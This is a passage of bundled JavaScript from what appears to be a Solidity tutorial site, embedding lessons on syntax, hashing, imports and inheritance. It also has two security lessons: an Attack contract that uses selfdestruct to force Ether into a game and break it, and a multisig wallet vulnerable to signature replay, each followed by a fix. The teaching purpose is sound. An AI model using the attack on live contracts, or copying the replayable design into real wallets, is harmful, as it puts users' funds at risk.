class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    EtherGame etherGame;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">EtherGame _etherGame</span>) </span>{\n        etherGame = EtherGame(_etherGame);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-comment">// You can simply break the game by sending ether so that</span>\n        <span class="hljs-comment">// the game balance &gt;= 7 ether</span>\n\n        <span class="hljs-comment">// cast address to payable</span>\n        <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> addr = <span class="hljs-keyword">payable</span>(<span class="hljs-keyword">address</span>(etherGame));\n        <span class="hljs-built_in">selfdestruct</span>(addr);\n    }\n}\n\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>Don&#39;t rely on <code>address(this).balance</code></p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount = <span class="hljs-number">3</span> <span class="hljs-literal">ether</span>;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> == <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);\n\n        balance += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n        <span class="hljs-built_in">require</span>(balance &lt;= targetAmount, <span class="hljs-string">"Game is over"</span>);\n\n        <span class="hljs-keyword">if</span> (balance == targetAmount) {\n            winner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n        }\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == winner, <span class="hljs-string">"Not winner"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}</code></pre>\n'})};var ps=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Signature Replay",description:"An example of a contract vulnerable to signature replay attack",html:'<p>Signing messages off-chain and having a contract that requires that signature before executing\na function is a useful technique.</p>\n<p>For example this technique is used to:</p>\n<ul>\n<li>reduce number of transaction on chain</li>\n<li>gas-less transaction, called <code>meta transcation</code></li>\n</ul>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>Same signature can be used multiple times to execute a function. This can be harmful\nif the signer&#39;s intention was to approve a transaction once.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">experimental</span> <span class="hljs-built_in">ABIEncoderV2</span>;</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">MultiSigWallet</span> </span>{\n    <span class="hljs-keyword">using</span> <span class="hljs-title">ECDSA</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">bytes32</span></span>;\n\n    <span class="hljs-keyword">address</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">public</span> owners;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _owners</span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        owners = _owners;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">bytes</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _sigs</span>)\n        <span class="hljs-title"><span class="hljs-keyword">external</span></span>\n    </span>{\n        <span class="hljs-keyword">bytes32</span> txHash = getTxHash(_to, _amount);\n        <span class="hljs-built_in">require</span>(_checkSigs(_sigs, txHash), <span class="hljs-string">"invalid sig"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> _amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTxHash</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(_to, _amount));\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_checkSigs</span>(<span class="hljs-params">\n        <span class="hljs-keyword">bytes</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _sigs,\n        <span class="hljs-keyword">bytes32</span> _txHash\n    </span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{\n        <span class="hljs-keyword">bytes32</span> ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; _sigs.<span class="hljs-built_in">length</span>; i++) {\n            <span class="hljs-keyword">address</span> signer = ethSignedHash.recover(_sigs[i]);\n            <span class="hljs-keyword">bool</span> valid = signer == owners[i];\n\n            <span class="hljs-keyword">if</span> (!valid) {\n                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;\n            }\n        }\n\n        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>Sign messages with <code>nonce</code> and address of the contract.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">experimental</span> <span class="hljs-built_in">ABIEncoderV2</span>;</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">MultiSigWallet</span> </span>{\n    <span class="hljs-keyword">using</span> <span class="hljs-title">ECDSA</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">bytes32</span></span>;\n\n    <span class="hljs-keyword">address</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">public</span> owners;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">bytes32</span> =&gt; <span class="hljs-keyword">bool</span>) <span class="hljs-keyword">public</span> executed;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _owners</span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        owners = _owners;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">uint</span> _nonce, <span class="hljs-keyword">bytes</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _sigs</span>)\n        <span class="hljs-title"><span class="hljs-keyword">external</span></span>\n    </span>{\n        <span class="hljs-keyword">bytes32</span> txHash = getTxHash(_to, _amount, _nonce);\n        <span class="hljs-built_in">require</span>(!executed[txHash], <span class="hljs-string">"tx executed"</span>);\n        <span class="hljs-built_in">require</span>(_checkSigs(_sigs, txHash), <span class="hljs-string">"invalid sig"</span>);\n\n        executed[txHash] = <span class="hljs-literal">true</span>;\n\n        (<span class="hljs-keyword">bool</span> sent, ) = _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> _amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTxHash</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">uint</span> _nonce</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), _to, _amount, _nonce));\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_checkSigs</span>(<span class="hljs-params">\n        <span class="hljs-keyword">bytes</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _sigs,\n        <span class="hljs-keyword">bytes32</span> _txHash\n    </span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{\n        <span class="hljs-keyword">bytes32</span> ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; _sigs.<span class="hljs-built_in">length</span>; i++) {\n            <span class="hljs-keyword">address</span> signer = ethSignedHash.recover(_sigs[i]);\n            <span class="hljs-keyword">bool</span> valid = signer == owners[i];\n\n            <span class="hljs-keyword">if</span> (!valid) {\n                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;\n            }\n        }\n\n        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;\n    }\n}\n\n<span class="hljs-comment">/*\n// owners\n0xe19aea93F6C1dBef6A3776848bE099A7c3253ac8\n0xfa854FE5339843b3e9Bfd8554B38BD042A42e340\n\n// to\n0xe10422cc61030C8B3dBCD36c7e7e8EC3B527E0Ac\n// amount\n100\n// nonce\n0\n// tx hash\n0x12a095462ebfca27dc4d99feef885bfe58344fb6bb42c3c52a7c0d6836d11448\n\n// signatures\n0x120f8ed8f2fa55498f2ef0a22f26e39b9b51ed29cc93fe0ef3ed1756f58fad0c6eb5a1d6f3671f8d5163639fdc40bb8720de6d8f2523077ad6d1138a60923b801c\n0xa240a487de1eb5bb971e920cb0677a47ddc6421e38f7b048f8aa88266b2c884a10455a52dc76a203a1a9a953418469f9eec2c59e87201bbc8db0e4d9796935cb1b\n*/</span></code></pre>\n'})};var ts=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Hashing with Keccak256",description:"Example of hashing using Keccak256 in Solidity",html:'<p><code>keccak256</code> computes the Keccak-256 hash of the input.</p>\n<p>Some use cases are:</p>\n<ul>\n<li>Creating an deterministic unique ID from a input</li>\n<li>Commit-Reveal scheme</li>\n<li>Compact cryptographic signature (by signing the hash instead of a larger input)</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HashFunction</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hash</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _text, <span class="hljs-keyword">uint</span> _num, <span class="hljs-keyword">address</span> _addr</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>)\n    </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(_text, _num, _addr));\n    }\n\n    <span class="hljs-comment">// Example of hash collision</span>\n    <span class="hljs-comment">// Hash collision can occur when you pass more than one dynamic data type</span>\n    <span class="hljs-comment">// to abi.encodePacked. In such case, you should use abi.encode instead.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">collision</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _text, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _anotherText</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>)\n    </span>{\n        <span class="hljs-comment">// encodePacked(AAA, BBB) -&gt; AAABBB</span>\n        <span class="hljs-comment">// encodePacked(AA, ABBB) -&gt; AAABBB</span>\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(_text, _anotherText));\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">GuessTheMagicWord</span> </span>{\n    <span class="hljs-keyword">bytes32</span> <span class="hljs-keyword">public</span> answer =\n        <span class="hljs-number">0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00</span>;\n\n    <span class="hljs-comment">// Magic word is "Solidity"</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">guess</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _word</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(_word)) == answer;\n    }\n}\n</code></pre>\n'})};var cs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Hello World",description:"Hello world in Solidity",html:'<p><code>pragma</code> specifies the compiler version of Solidity.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-comment">// compiler version must be greater than or equal to 0.7.6 and less than 0.8.0</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HelloWorld</span> </span>{\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> greet = <span class="hljs-string">"Hello World!"</span>;\n}\n</code></pre>\n'})};var rs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"If / Else",description:"If / Else conditional statement in Solidity",html:'<p>Solidity support conditional statements <code>if</code>, <code>else if</code> and <code>else</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">IfElse</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">10</span>) {\n            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;\n        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">20</span>) {\n            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;\n        } <span class="hljs-keyword">else</span> {\n            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;\n        }\n    }\n}\n</code></pre>\n'})};var os=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Import",description:"Learn how to import other Solidity files",html:'<p>You can import local and external files in Solidity.</p>\n<h3 id="local">Local</h3>\n<p>Here is our folder structure.</p>\n<pre><code>\u251c\u2500\u2500 Import.sol\n\u2514\u2500\u2500 Foo.sol</code></pre>\n<p>Foo.sol</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Foo</span> </span>{\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> name = <span class="hljs-string">"Foo"</span>;\n}\n</code></pre>\n<p>Import.sol</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// import Foo.sol from current directory</span>\n<span class="hljs-keyword">import</span> <span class="hljs-string">"./Foo.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Import</span> </span>{\n    <span class="hljs-comment">// Initialize Foo.sol</span>\n    Foo <span class="hljs-keyword">public</span> foo = <span class="hljs-keyword">new</span> Foo();\n\n    <span class="hljs-comment">// Test Foo.sol by getting it&#x27;s name.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFooName</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> foo.<span class="hljs-built_in">name</span>();\n    }\n}\n</code></pre>\n<h3 id="external">External</h3>\n<p>You can also import from <a href="https://github.com">GitHub</a> by simply copying the url</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// https://github.com/owner/repo/blob/branch/path/to/Contract.sol</span>\n<span class="hljs-keyword">import</span> <span class="hljs-string">"https://github.com/owner/repo/blob/branch/path/to/Contract.sol"</span>;\n\n<span class="hljs-comment">// Example import ECDSA.sol from openzeppelin-contract repo, release-v3.3 branch</span>\n<span class="hljs-comment">// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol</span>\n<span class="hljs-keyword">import</span> <span class="hljs-string">"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol"</span>;</code></pre>\n'})};var is=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Inheritance",description:"Example of inheritance in Solidity",html:'<p>Solidity supports multiple inheritance. Contracts can inherit other contract by using the <code>is</code> keyword.</p>\n<p>Function that is going to be overridden by a child contract must be declared as <code>virtual</code>.</p>\n<p>Function that is going to override a parent function must use the keyword <code>override</code>.</p>\n<p>Order of inheritance is important.</p>\n<p>You have to list the parent contracts in the order from \u201cmost base-like\u201d to \u201cmost derived\u201d.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/* Graph of inheritance\n    A\n   / \\\n  B   C\n / \\ /\nF  D,E\n\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"A"</span>;\n    }\n}\n\n<span class="hljs-comment">// Contracts inherit other contracts by using the keyword &#x27;is&#x27;.</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">B</span> <span class="hljs-keyword">is</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-comment">// Override A.foo()</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"B"</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">C</span> <span class="hljs-keyword">is</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-comment">// Override A.foo()</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"C"</span>;\n    }\n}\n\n<span class="hljs-comment">// Contracts can inherit from multiple parent contracts.</span>\n<span class="hljs-comment">// When a function is called that is defined multiple times in</span>\n<span class="hljs-comment">// different contracts, parent contracts are searched from</span>\n<span class="hljs-comment">// right to left, and in depth-first manner.</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">D</span> <span class="hljs-keyword">is</span> <span class="hljs-title">B</span>, <span class="hljs-title">C</span> </span>{\n    <span class="hljs-comment">// D.foo() returns "C"</span>\n    <span class="hljs-comment">// since C is the right most parent contract with function foo()</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span>(<span class="hljs-params">B, C</span>) <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.foo();\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">E</span> <span class="hljs-keyword">is</span> <span class="hljs-title">C</span>, <span class="hljs-title">B</span> </span>{\n    <span class="hljs-comment">// E.foo() returns "B"</span>\n    <span class="hljs-comment">// since B is the right most parent contract with function foo()</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span>(<span class="hljs-params">C, B</span>) <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.foo();\n    }\n}\n\n<span class="hljs-comment">// Inheritance must be ordered from \u201cmost base-like\u201d to \u201cmost derived\u201d.</span>\n<span class="hljs-comment">// Swapping the order of A and B will throw a compilation error.</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">F</span> <span class="hljs-keyword">is</span> <span class="hljs-title">A</span>, <span class="hljs-title">B</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span>(<span class="hljs-params">A, B</span>) <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.foo();\n    }\n}\n</code></pre>\n'})};var hs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Interface",description:"An example of interface in Solidity",html:'<p>You can interact with other contracts by declaring an <code>Interface</code>.</p>\n<p>Interface</p>\n<ul>\n<li>cannot have any functions implemented</li>\n<li>can inherit from other interfaces</li>\n<li>all declared functions must be external</li>\n<li>cannot declare a constructor</li>\n<li>cannot declare state variables</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Counter</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> count;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increment</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{\n        count += <span class="hljs-number">1</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ICounter</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">count</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span 